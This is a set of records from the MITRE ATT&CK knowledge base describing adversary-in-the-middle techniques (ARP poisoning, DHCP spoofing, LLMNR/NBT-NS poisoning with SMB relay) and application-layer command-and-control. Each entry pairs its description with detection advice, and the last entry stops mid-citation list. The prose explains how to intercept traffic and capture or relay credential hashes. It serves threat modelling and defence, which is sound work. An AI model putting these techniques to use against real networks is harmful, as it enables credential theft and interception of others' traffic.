{"ID":"T1557","name":"Adversary-in-the-Middle","description":"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.(Citation: volexity_0day_sophos_FW) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).","url":"https://attack.mitre.org/techniques/T1557","created":"11 February 2020","last modified":"30 March 2023","version":"2.2","tactics":"Collection, Credential Access","detection":"Monitor network traffic for anomalies associated with known AiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.","platforms":"Linux, Network, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Daniil Yugoslavskiy, @yugoslavskiy, Atomic Threat Coverage project; Mayuresh Dani, Qualys; NEC","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CheckPoint Dok),(Citation: objsee mac malware 2017),(Citation: CISA AA20-301A Kimsuky),"}
{"ID":"T1557.002","name":"Adversary-in-the-Middle: ARP Cache Poisoning","description":"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n","url":"https://attack.mitre.org/techniques/T1557/002","created":"15 October 2020","last modified":"22 July 2022","version":"1.1","tactics":"Collection, Credential Access","detection":"Monitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. \n\nConsider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1557","defenses bypassed":null,"contributors":"Jon Sternstein, Stern Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender LuminousMoth July 2021),(Citation: Cylance Cleaver),(Citation: Cisco ARP Poisoning Mitigation 2016),(Citation: Juniper DAI 2020)"}
{"ID":"T1557.003","name":"Adversary-in-the-Middle: DHCP Spoofing","description":"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool. ","url":"https://attack.mitre.org/techniques/T1557/003","created":"24 March 2022","last modified":"21 October 2022","version":"1.1","tactics":"Collection, Credential Access","detection":"Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which specify that the IP allocations are low or have run out; these EIDs may indicate a denial of service attack.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes)","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1557","defenses bypassed":null,"contributors":"Alex Spivakovsky, Pentera; Andrew Allen, @whitehat_zero","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: ntlm_relaying_kerberos_del),(Citation: dhcp_serv_op_events)"}
{"ID":"T1557.001","name":"Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay","description":"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)","url":"https://attack.mitre.org/techniques/T1557/001","created":"11 February 2020","last modified":"25 October 2022","version":"1.4","tactics":"Collection, Credential Access","detection":"Monitor <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code> for changes to the \"EnableMulticast\" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\n\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\n\nDeploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)","platforms":"Windows","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Service: Service Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1557","defenses bypassed":null,"contributors":"Andrew Allen, @whitehat_zero; Eric Kuehn, Secure Ideas; Matthew Demaske, Adaptforward","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: GitHub Responder),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Impacket Tools),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: GitHub Inveigh),(Citation: GitHub Pupy),(Citation: Secure Ideas SMB Relay),(Citation: byt3bl33d3r NTLM Relaying),(Citation: Microsoft SMB Packet Signing),(Citation: ADSecurity Windows Secure Baseline)"}
{"ID":"T1071","name":"Application Layer Protocol","description":"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ","url":"https://attack.mitre.org/techniques/T1071","created":"31 May 2017","last modified":"11 April 2023","version":"2.1","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Duane Michael","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: DFIR Phosphorus November 2021),(Citation: Talos Rocke August 2018),(Citation: cobaltstrike manual),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: US-CERT TA18-074A),(Citation: Talos Cobalt Strike September 2020),(Citation: Symantec W32.Duqu),(Citation: Unit 42 Hildegard Malware),(Citation: Trend Micro DRBControl February 2020),(Citation: Kaspersky Regin),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Trend Micro TeamTNT),"}
{"ID":"T1071.004","name":"Application Layer Protocol: DNS","description":"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ","url":"https://attack.mitre.org/techniques/T1071/004","created":"15 March 2020","last modified":"17 June 2022","version":"1.1","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for DNS traffic to/from known-bad or suspicious domains.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1071","defenses bypassed":null,"contributors":"Chris Heald; Jan Petrov, Citi","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Securelist Denis April 2017),(Citation: NCSC APT29 July 2020),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: NCC Group Chimera January 2021),(Citation: ClearSky Wilted Tulip July 2017),(Citation: GitHub Sliver C2 DNS),(Citation: NCC Group APT15 Alive and Strong),(Citation: ClearSky Siamesekitten August 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye FIN7 Aug 2018),(Citation: Palo Alto OilRig Sep 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: ESET InvisiMole June 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Check Point APT34 April 2021),(Citation: Palo Alto DNS Requests),(Citation: Cisco DNSMessenger March 2017),(Citation: CopyKittens Nov 2015),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: PTSecurity Cobalt Dec 2016),(Citation: FireEye APT34 July 2019),(Citation: SecureWorks August 2019),(Citation: FireEye APT32 May 2017),(Citation: Cyberreason Anchor December 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: FireEye APT41 Aug 2019),(Citation: ESET Ebury Feb 2014),(Citation: Mythc Documentation),(Citation: BlackBerry CostaRicto November 2020),(Citation: Dell TG-3390),(Citation: Accenture Lyceum Targets November 2021),(Citation: Symantec Remsec IOCs),(Citation: Kaspersky Lyceum October 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: fsecure NanHaiShu July 2016),(Citation: Palo Alto OilRig May 2016),(Citation: PWC WellMess July 2020),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: FireEye FIN7 March 2017),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Unit42 OilRig Playbook 2023),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender Chafer May 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Zscaler Cobian Aug 2017),(Citation: ESET Gelsemium June 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Group IB APT 41 June 2021),(Citation: Medium Anchor DNS July 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: cobaltstrike manual),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Unit42 RDAT July 2020),(Citation: FireEye FiveHands April 2021),(Citation: ThreatStream Evasion Analysis),(Citation: Trend Micro Black Basta October 2022),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1071.002","name":"Application Layer Protocol: File Transfer Protocols","description":"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","url":"https://attack.mitre.org/techniques/T1071/002","created":"15 March 2020","last modified":"21 August 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1071","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: VirusBulletin Kimsuky October 2019),(Citation: 360 Machete Sep 2020),(Citation: XAgentOSX 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Talos ZxShell Oct 2014),(Citation: Unit42 SilverTerrier 2018),(Citation: ESET Machete July 2019),(Citation: Cylance Machete Mar 2017),(Citation: Mythc Documentation),(Citation: ESET Attor Oct 2019),(Citation: Talos PoetRAT October 2020),(Citation: Unit 42 CARROTBAT January 2020),(Citation: FireEye APT41 March 2020),(Citation: McAfee Honeybee),"}
{"ID":"T1071.003","name":"Application Layer Protocol: Mail Protocols","description":"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","url":"https://attack.mitre.org/techniques/T1071/003","created":"15 March 2020","last modified":"21 October 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1071","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: ESET LightNeuron May 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: Mandiant UNC3890 Aug 2022),(Citation: CISA AA20-301A Kimsuky),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit42 SilverTerrier 2018),(Citation: Unit42 Sofacy Dec 2018),(Citation: ESET Zebrocy Nov 2018),(Citation: Symantec Remsec IOCs),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Fortinet Agent Tesla June 2017),(Citation: Microsoft SIR Vol 19),(Citation: ESET ComRAT May 2020),(Citation: Unit42 Cannon Nov 2018),(Citation: ESET Zebrocy May 2019),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: FireEye APT28),(Citation: Talos NavRAT May 2018),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: Unit42 RDAT July 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1071.001","name":"Application Layer Protocol: Web Protocols","description":"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","url":"https://attack.mitre.org/techniques/T1071/001","created":"15 March 2020","last modified":"11 April 2023","version":"1.1","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1071","defenses bypassed":null,"contributors":"TruKno","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto Comnie),(Citation: Kaspersky Dridex May 2017),(Citation: ProofPoint Ursnif Aug 2016),(Citation: McAfee Lazarus Nov 2020),(Citation: Costa AvosLocker May 2022),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: Crowdstrike Qakbot October 2020),(Citation: FireEye APT34 July 2019),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Unit42 Emissary Panda May 2019),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: objsee mac malware 2017),(Citation: PWC WellMess C2 August 2020),(Citation: Talos Promethium June 2020),(Citation: KISA Operation Muzabi),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Kaspersky Sofacy),(Citation: Mandiant APT1 Appendix),(Citation: JPCERT ChChes Feb 2017),(Citation: Securelist APT10 March 2021),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Check Point APT34 April 2021),(Citation: NorthSec 2015 GData Uroburos Tools),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 WhisperGate January 2022),(Citation: Mythc Documentation),(Citation: CISA SoreFang July 2016),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Unit42 Sofacy Dec 2018),(Citation: Kaspersky Regin),(Citation: Symantec Remsec IOCs),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: FireEye admin@338),(Citation: PWC WellMess July 2020),(Citation: ESET Crutch December 2020),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Unit 42 Valak July 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Cybereason Chaes Nov 2020),(Citation: Accenture Hogfish April 2018),(Citation: Cyberreason Anchor December 2019),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: FireEye Fin8 May 2016),(Citation: Forcepoint Felismus Mar 2017),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Talos ZxShell Oct 2014),(Citation: ESET Zebrocy May 2019),(Citation: Medium S2W WhisperGate January 2022),(Citation: CrowdStrike Grim Spider May 2019),(Citation: F-Secure Cosmicduke),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: FireEye APT29),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Symantec Orangeworm IOCs April 2018),(Citation: Trend Micro Black Basta October 2022),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: McAfee Sodinokibi October 2019),(Citation: Microsoft NICKEL December 2021),(Citation: Fidelis INOCNATION),(Citation: McAfee Bankshot),(Citation: McAfee Maze March 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Trustwave GoldenSpy June 2020),(Citation: Cybereason Bazar July 2020),(Citation: HP SVCReady Jun 2022),(Citation: Infoblox Lokibot January 2019),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Mandiant APT41),(Citation: Unit 42 BackConfig May 2020),(Citation: cobaltstrike manual),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: FireEye FiveHands April 2021),(Citation: BlackBerry Amadey 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Kaspersky Carbanak),(Citation: ATT Sidewinder January 2021),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: ESET Grandoreiro April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: wardle evilquest partii),(Citation: Mandiant UNC3313 Feb 2022),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: NCSC Cyclops Blink February 2022),(Citation: F-Secure BlackEnergy 2014),(Citation: Morphisec ShellTea June 2019),(Citation: GitHub PoshC2),(Citation: CrowdStrike StellarParticle January 2022),(Citation: ANSSI Sandworm January 2021),(Citation: Unit 42 NETWIRE April 2020),(Citation: Anomali Rocke March 2019),(Citation: Juniper IcedID June 2020),(Citation: Unit 42 PingPull Jun 2022),(Citation: McAfee Night Dragon),(Citation: Microsoft Actinium February 2022),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: Symantec Dyre June 2015),(Citation: Lotus Blossom Jun 2015),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Palo Alto Networks BBSRAT),(Citation: NCSC APT29 July 2020),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: RATANKBA),(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: TrendMicro Gamaredon April 2020),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT41 March 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: reed thiefquest ransomware analysis),(Citation: Symantec Elfin Mar 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: Symantec Shuckworm January 2022),(Citation: Microsoft SIR Vol 19),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Intezer TeamTNT September 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: Qualys LolZarus),(Citation: Unit42 Xbash Sept 2018),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Malwarebytes Konni Aug 2021),(Citation: Volexity OceanLotus Nov 2017),(Citation: Dell Sakula),(Citation: ESET GreyEnergy Oct 2018),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Lazarus RATANKBA),(Citation: TrendMicro Taidoor),(Citation: ESET Industroyer),(Citation: Dell TG-3390),(Citation: Kaspersky Lyceum October 2021),(Citation: Talos Group123),(Citation: ObjectiveSee AppleJeus 2019),(Citation: Sofacy Komplex Trojan),(Citation: Proofpoint ZeroT Feb 2017),(Citation: ESET Gazer Aug 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: FireEye Periscope March 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: Palo Alto Reaver Nov 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: NCC Group Chimera January 2021),(Citation: Lotus Blossom Dec 2015),(Citation: Talos Micropsia June 2017),(Citation: Palo Alto Sofacy 06-2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Kaspersky Turla Aug 2014),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Symantec Vasport May 2012),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: Talos Lokibot Jan 2021),(Citation: MacKeeper Bundlore Apr 2019),(Citation: FireEye APT29 Nov 2018),(Citation: GitHub Sliver C2),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Accenture HyperStack October 2020),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: FireEye APT38 Oct 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Trusteer Carberp October 2010),(Citation: Guidepoint 